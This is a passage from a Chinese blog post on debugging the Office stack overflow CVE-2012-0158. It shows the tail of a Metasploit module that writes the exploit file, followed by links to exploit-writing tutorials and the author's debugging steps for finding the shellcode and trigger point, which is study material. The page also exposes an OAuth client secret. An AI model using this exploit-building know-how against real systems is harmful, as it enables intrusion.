"00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><br><span class="line">        content &lt;&lt; "00000000000000"</span><br><span class="line">        content &lt;&lt; "\n"</span><br><span class="line">        content &lt;&lt; "&#125;"</span><br><span class="line">        content &lt;&lt; "&#125;"</span><br><span class="line">        content &lt;&lt; "&#125;"</span><br><span class="line"> </span><br><span class="line">        print_status("Creating '#&#123;datastore['FILENAME']&#125;' file ...")</span><br><span class="line">        file_create(content)</span><br><span class="line"> </span><br><span class="line">    end</span><br><span class="line"> </span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<p>msf exploit脚本编写学习资料<br><a href="http://bbs.pediy.com/showthread.php?t=101887" target="_blank" rel="external">Exploit 编写系列教程第四篇：编写Metasploit exploit</a><br><a href="http://sebug.net/paper/other/metasploit_users_guide_chinese.pdf" target="_blank" rel="external">Metasploit Framework下的Exploit应用开发中文手册</a></p>
<p>##总结<br>本次调试主要是学习了以下几点：<br>1.使用MetaSploit生成漏洞利用样本<br>2.开启DEP功能，当执行异常后直接在shellcode首地址断下，再查看堆栈找到栈溢出跳板地址<br>3.对栈溢出跳板地址下断点，查看断下来的esp下面找到漏洞触发地址</p>
<p><strong>更新</strong><br>看到两篇寻找漏洞触发点的文章，觉得可行性不错<br>1.<a href="http://www.cnblogs.com/Ox9A82/p/5709817.html" target="_blank" rel="external">CVE-2012-0158基于exp分析</a>对这块栈下写入内存写入断点，根据断点输出情况来分析(ba w 4 0x12165C “r eip;gc”)<br>2.<a href="https://weiyiling.cn/one/cve-2012-0158-ms12-027" target="_blank" rel="external">CVE-2012-0158（ms12-027）漏洞分析与利用</a>监控那些目标内存地址是在栈地址（即临时函数的变量地址），而拷贝的长度超过一个比较大的值判断为可疑的漏洞操作<br>3.发现泉哥的书漏洞战争写得很好，直接看书然后跟着调试比较好</p>

      
    </div>
    <footer>
      

        
          <div class="alignleft post-nav">
            <em>上一篇: </em><a href="/2016/06/03/Learning/note-about-ndk-md/">Android初学笔记</a>
          </div>
        
        
          <div class="alignright post-nav">
            <em>下一篇: </em><a href="/2016/05/03/Learning/note-about-linux-md/">Linux笔记</a>
          </div>
          <div class="clearfix"></div>
        

        
          <div class="copyright">
            
              <span class="claim">转载请注明youngroe.com</span>
            
            
              <span class="from-link">
                <em>本文链接地址:</em>
                <a href="/2016/05/23/Debug/debug-vulner-stackoverflows-2012-0158/">
                  http://www.youngroe.com/2016/05/23/Debug/debug-vulner-stackoverflows-2012-0158/
                </a>
              </span>
            
          </div>
        
        
  
  <div class="categories">
    <a href="/categories/Debug/">Debug</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/栈溢出漏洞/">栈溢出漏洞</a>, <a href="/tags/漏洞调试/">漏洞调试</a>
  </div>

        
          <! -- 添加捐赠图标 -->
<div class ="post-donate">
    <div id="donate_board" class="donate_bar center">
        <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏"></a>
        <span class="donate_txt">
           ↑<br>
           欣赏此文？求鼓励，求支持！
        </span>
        <br>
      </div>  
    <div id="donate_guide" class="donate_bar center hidden" >
        <!-- 方式一： 
            ![](/img/Alipay.jpg)
            ![](/img/WeChatpay.jpg)
        -->
        <!-- 方式二；
            step1：在_config.yml中添加配置
                Alipay: /img/Alipay.jpg
                WeChatpay: /img/WeChatpay.jpg
            step2：此处两张图片的路径分别设置为如下
                <img src="undefined"
                <img src="undefined"
        -->
        <!-- 支付宝打赏图案 -->
        <img src="/img/Alipay.png" alt="支付宝打赏">
        <!-- 微信打赏图案 -->
        <img src="/img/WeChatpay.png" alt="微信打赏">
    </div>
    <script type="text/javascript">
        document.getElementById('btn_donate').onclick = function(){
            $('#donate_board').addClass('hidden');
            $('#donate_guide').removeClass('hidden');
        }
    </script>
</div>
<! -- 添加捐赠图标 -->
        
        <div id="gitalk-container"></div>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
  clientID: '503c39aa3fb2b8c1b734',
  clientSecret: '65d784ff7a95a9dbf4a4208c9e32166ca29654f2',
  repo: 'geemion.github.io',
  owner: 'geemion',
  admin: 'geemion',
  pagerDirection:'first',
  id: md5(window.location.pathname)
})

gitalk.render('gitalk-container')
</script>
      
      <div class="clearfix"></div>
    </footer>
  </div>
  <div id="container"></div>
</span>
</article>


<section id="comment">
</section>

</div></div>
    <aside id="sidebar" class="alignright">
  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/Cybersecurity/">Cybersecurity</a><small>1</small></li>
  
    <li><a href="/categories/Debug/">Debug</a><small>7</small></li>
  
    <li><a href="/categories/Kernel/">Kernel</a><small>4</small></li>
  
    <li><a href="/categories/Learning/">Learning</a><small>8</small></li>
  
    <li><a href="/categories/Life/">Life</a><small>7</small></li>
  
    <li><a href="/categories/Others/">Others</a><small>1</small></li>
  
    <li><a href="/categories/Read-Notes/">Read Notes</a><small>7</small></li>
  
    <li><a href="/categories/Tools/">Tools</a><small>6</small></li>
  
    <li><a href="/categories/Vulnerabilities/">Vulnerabilities</a><small>0</small></li>
  
    <li><a href="/categories/Windows/">Windows</a><small>14</small></li>
  
    <li><a href="/categories/life/">life</a><small>0</small></li>
  
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="/2019/07/01/Windows/delphi_reverse_summary/">Delphi程序逆向反汇编技巧小记</a>
      </li>
    
      <li>
        <a href="/2019/06/25/Kernel/kernel_enum_wfp_callout_function/">Windows内核重拾：如何枚举系统中Windows Filtering Platform (WFP)驱动中的callout函数</a>
      </li>
    
      <li>
        <a href="/2019/05/06/Kernel/windows-driver-testing-basics/">Windows内核重拾：Windows驱动测试基础：工具、功能和示例（翻译/转载）</a>
      </li>
    
      <li>
        <a href="/2019/04/06/Windows/how-to-reverse-engineer-software-windows-in-a-right-way/">如何正确的对Windows软件进行逆向工程（翻译/转载）</a>
      </li>
    
      <li>
        <a href="/2019/01/12/Windows/a_crash_lead_deadlock/">Windows平台下一个崩溃而导致的死锁分析</a>
      </li>
    
      <li>
        <a href="/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a>
      </li>
    
      <li>
        <a href="/2018/10/06/Cybersecurity/ddos-protection-techniques/">现代DDoS对抗技术概述（翻译/转载）</a>
      </li>
    
      <li>
        <a href="/2018/09/18/Life/xian/">西安周末游</a>
      </li>
    
      <li>
        <a href="/2018/01/06/Kernel/WindowsKernel_DebugObject/">Windows内核重拾：DebugObject</a>
      </li>
    
      <li>
        <a href="/2017/10/23/Tools/IDA-Pro-ClassInformer-Tutorial/">IDA Pro ClassInformer使用指南（翻译）</a>
      </li>
    
      <li>
        <a href="/2017/05/23/Windows/Kernel Data and Filtering Support/">Kernel Data and Filtering Support for Windows Server 2008（翻译）</a>
      </li>
    
      <li>
        <a href="/2017/05/17/Windows/Windows-x64-Shellcode/">Windows x64 Shellcode编写指南(翻译)</a>
      </li>
    
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/ASM/" style="font-size: 12.5px;">ASM</a> <a href="/tags/Boost/" style="font-size: 10px;">Boost</a> <a href="/tags/DDoS/" style="font-size: 10px;">DDoS</a> <a href="/tags/DNS-over-HTTPS/" style="font-size: 10px;">DNS-over-HTTPS</a> <a href="/tags/Delphi/" style="font-size: 10px;">Delphi</a> <a href="/tags/Dll劫持/" style="font-size: 10px;">Dll劫持</a> <a href="/tags/GCC-GDB/" style="font-size: 10px;">GCC&GDB</a> <a href="/tags/GetVersionEx/" style="font-size: 10px;">GetVersionEx</a> <a href="/tags/Http/" style="font-size: 10px;">Http</a> <a href="/tags/IDA-Pro/" style="font-size: 12.5px;">IDA Pro</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/MSDN/" style="font-size: 12.5px;">MSDN</a> <a href="/tags/Malware/" style="font-size: 12.5px;">Malware</a> <a href="/tags/MiniDumpWriteDump/" style="font-size: 10px;">MiniDumpWriteDump</a> <a href="/tags/PEB/" style="font-size: 10px;">PEB</a> <a href="/tags/Procmon/" style="font-size: 10px;">Procmon</a> <a href="/tags/Runtime-Error/" style="font-size: 10px;">Runtime Error</a> <a href="/tags/SEH/" style="font-size: 10px;">SEH</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/SysinternalsSuite/" style="font-size: 10px;">SysinternalsSuite</a> <a href="/tags/Tips/" style="font-size: 10px;">Tips</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/UAF漏洞/" style="font-size: 10px;">UAF漏洞</a> <a href="/tags/VC/" style="font-size: 10px;">VC</a> <a href="/tags/Visual-Studio/" style="font-size: 12.5px;">Visual Studio</a> <a href="/tags/Windbg/" style="font-size: 10px;">Windbg</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/Windows核心编程/" style="font-size: 17.5px;">Windows核心编程</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/getaddrinfo/" style="font-size: 10px;">getaddrinfo</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/libeay32/" style="font-size: 10px;">libeay32</a> <a href="/tags/markdown/" style="font-size: 10px;">markdown</a> <a href="/tags/ndk/" style="font-size: 10px;">ndk</a> <a href="/tags/sublime-text3/" style="font-size: 10px;">sublime text3</a> <a href="/tags/x64/" style="font-size: 12.5px;">x64</a> <a href="/tags/体验/" style="font-size: 10px;">体验</a> <a href="/tags/内核/" style="font-size: 12.5px;">内核</a> <a href="/tags/内核结构/" style="font-size: 15px;">内核结构</a> <a href="/tags/学习/" style="font-size: 10px;">学习</a> <a href="/tags/安全机制/" style="font-size: 10px;">安全机制</a> <a href="/tags/异常处理/" style="font-size: 10px;">异常处理</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/服务/" style="font-size: 10px;">服务</a> <a href="/tags/权限/" style="font-size: 12.5px;">权限</a> <a href="/tags/栈溢出漏洞/" style="font-size: 10px;">栈溢出漏洞</a> <a href="/tags/测试/" style="font-size: 10px;">测试</a> <a href="/tags/浮躁/" style="font-size: 10px;">浮躁</a> <a href="/tags/漏洞调试/" style="font-size: 12.5px;">漏洞调试</a> <a href="/tags/生活/" style="font-size: 15px;">生活</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/西安/" style="font-size: 10px;">西安</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/读书/" style="font-size: 10px;">读书</a> <a href="/tags/调试/" style="font-size: 15px;">调试</a> <a href="/tags/转换/" style="font-size: 10px;">转换</a> <a href="/tags/进程/" style="font-size: 10px;">进程</a> <a href="/tags/逆向/" style="font-size: 10px;">逆向</a> <a href="/tags/重庆/" style="font-size: 10px;">重庆</a> <a href="/tags/驱动/" style="font-size: 15px;">驱动</a>
  </div>
</div>


  <div class="widget tag">
<h3 class="title">Links</h3>
<ul class="entry">
<li><a href="http://blog.ourren.com/" title="Ourren">Ourren</a></li>
<li><a href="http://www.hyjal.net/" title="Hyjal">Hyjal</a></li>
<li><a href="http://www.jianshu.com/users/fa15f4e416ae/latest_articles" title="Daemonceltics">Daemonceltics</a></li>
<li><a href="http://papap.info/" title="isee">isee</a></li>
</ul>
</div>

  <script type="text/javascript" id="clustrmaps" src="//cdn.clustrmaps.com/map_v2.js?u=putG&d=yoFnN6V-ovhL-H4e9_69LvkTiX4uX7rEYJ15yL3G1Wg"></script>
</aside>
    <div class="clearfix"></div>
  </div>
  <div id="go-pg-top"><i class="icon-arrow-up"></i></div>
  <footer id="footer" class="inner"><div class="alignleft">
  
  &copy; 2020 Lyon
  
</div>
<div class="clearfix"></div></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript" charset="utf-8" src="/js/page.js"></script>

</body>

</html>